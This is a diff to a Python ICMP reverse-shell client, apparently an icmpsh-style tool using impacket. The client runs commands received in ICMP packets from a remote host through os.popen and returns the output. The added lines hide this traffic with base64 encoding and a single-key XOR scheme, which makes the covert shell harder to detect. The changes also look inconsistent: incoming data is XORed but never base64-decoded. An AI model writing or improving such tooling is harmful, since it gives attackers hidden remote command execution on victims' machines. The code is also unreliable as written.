@@ -25,6 +25,7 @@ import socket
 import subprocess
 import sys
 import time
+import base64
 
 def setNonBlocking(fd):
     """
@@ -36,6 +37,15 @@ def setNonBlocking(fd):
     flags = fcntl.fcntl(fd, fcntl.F_GETFL)
     flags = flags | os.O_NONBLOCK
     fcntl.fcntl(fd, fcntl.F_SETFL, flags)
+
+def xor_encrypt(aString, key):
+        kIdx = 0
+        cryptStr = ""
+        for x in range(len(aString)):
+            cryptStr = cryptStr + chr( ord(aString[x]) ^ ord(key[kIdx]))
+            kIdx = (kIdx + 1) % len(key)
+
+        return cryptStr
 
 def main(dst):
  while True:
@@ -75,7 +85,7 @@ def main(dst):
     decoder = ImpactDecoder.IPDecoder()
 
     # Include a 156-character long payload inside the ICMP packet.
-    icmp.contains(ImpactPacket.Data("\nshell#"))
+    icmp.contains(ImpactPacket.Data(base64.b64encode("\nshell#")))
 
     # Have the IP packet contain the ICMP packet (along with its payload).
     ip.contains(icmp)
@@ -118,13 +128,13 @@ def main(dst):
                 seq_id = icmppacket.get_icmp_seq()
                 seq_id += 1
 		data = icmppacket.get_data_as_string()
-
+		data = xor_encrypt(data,"K")
                 if len(data) > 0:
                     sys.stdout.write(data + "\nshell#")
 
                 #Parse command from standard input
 		strcmd = os.popen(data).read()
-                
+                strcmd = base64.b64encode(strcmd)
                 # Set sequence number and identifier
                 icmp.set_icmp_id(ident)
                 icmp.set_icmp_seq(seq_id)
